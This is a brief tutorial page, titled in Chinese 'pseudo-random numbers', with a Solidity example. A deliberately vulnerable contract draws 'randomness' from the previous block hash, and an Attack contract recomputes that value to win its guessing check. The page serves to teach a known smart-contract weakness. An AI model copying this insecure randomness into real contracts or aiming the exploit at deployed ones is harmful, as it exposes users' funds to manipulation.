# 伪随机数

<DocsAD/>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract BadRandom {
    string text = "GEEKFZ";

    function test(uint256 number) external view returns(string memory){
        uint256 randomNumber = uint256(blockhash(block.number - 1));

        if (randomNumber == number){
            return "DeeLMind";
        }else{
            return text;
        }
    }
}

contract Attack {
    function attack(BadRandom b) external view returns(string memory){
        uint256 number = uint256(blockhash(block.number - 1));
        return b.test(number);
    }
}
```